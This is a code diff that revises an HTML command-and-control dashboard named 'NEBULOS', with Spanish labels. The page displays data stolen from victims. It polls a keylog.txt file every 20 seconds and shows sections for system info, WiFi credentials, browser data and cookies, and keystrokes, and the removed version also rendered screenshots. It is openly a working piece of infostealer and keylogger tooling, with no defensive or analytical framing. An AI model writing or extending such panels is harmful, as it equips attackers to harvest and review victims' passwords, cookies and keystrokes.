@@ -1,49 +1,44 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>NEBULOS | C2 Terminal</title>
+    <title>NEBULOS | C2 CONTROL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .nav { margin-bottom: 20px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
-        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; margin-right: 5px; }
-        button:hover, .act { background: #0f0; color: #000; }
-        #out { background: #050505; border: 1px solid #0f0; height: 500px; overflow-y: auto; padding: 15px; white-space: pre-wrap; }
-        img { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .box { border: 2px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #003b00; }
+        .nav { margin-bottom: 20px; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
+        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; cursor: pointer; }
+        button:hover, .active { background: #00ff41; color: #000; font-weight: bold; }
+        pre { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #003b00; padding: 10px; }
     </style>
 </head>
 <body>
-    <div class="nav">
-        <button class="act" onclick="v('f')">FULL REPORT</button>
-        <button onclick="v('w')">WIFI</button>
-        <button onclick="v('n')">NAVEGADOR</button>
-        <button onclick="v('k')">KEYLOG</button>
-        <button onclick="v('s')">SCREENSHOT</button>
+    <div class="box">
+        <h2>[ NEBULOS SYSTEM ACTIVATED ]</h2>
+        <div class="nav">
+            <button onclick="view('sys')">SISTEMA</button>
+            <button onclick="view('wifi')">WIFI</button>
+            <button onclick="view('nav')">NAVEGADOR/COOKIES</button>
+            <button onclick="view('key')">KEYLOGGER</button>
+            <button onclick="view('all')">VER TODO</button>
+        </div>
+        <pre id="console">Estableciendo enlace...</pre>
     </div>
-    <div id="out">Cargando datos...</div>
-    <img id="img">
 
     <script>
         let raw = "";
-        async function up() {
-            try {
-                const r = await fetch('keylog.txt?t=' + Math.random());
-                if(r.ok) { raw = await r.text(); v('f'); }
-            } catch(e) {}
+        async function update() {
+            const r = await fetch('keylog.txt?t=' + Math.random());
+            if(r.ok) { raw = await r.text(); view('all'); }
         }
-        function v(m) {
-            const o = document.getElementById('out');
-            const i = document.getElementById('img');
-            i.style.display = "none"; o.style.display = "block";
-            if(m === 'w') o.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAV ---')[0];
-            else if(m === 'n') o.textContent = raw.split('--- NAV ---')[1]?.split('--- KEYS ---')[0];
-            else if(m === 'k') o.textContent = raw.split('--- KEYS ---')[1]?.split('--- SS ---')[0];
-            else if(m === 's') {
-                const b = raw.split('--- SS ---')[1]?.trim();
-                if(b) { i.src = "data:image/png;base64," + b; i.style.display = "block"; o.style.display = "none"; }
-            } else o.textContent = raw;
+        function view(mode) {
+            const c = document.getElementById('console');
+            if(mode==='sys') c.textContent = raw.split('--- SISTEMA ---')[1]?.split('--- WIFI ---')[0];
+            else if(mode==='wifi') c.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
+            else if(mode==='nav') c.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYLOGGER ---')[0];
+            else if(mode==='key') c.textContent = raw.split('--- KEYLOGGER ---')[1];
+            else c.textContent = raw;
         }
-        setInterval(up, 30000); up();
+        setInterval(update, 20000); update();
     </script>
 </body>
 </html>
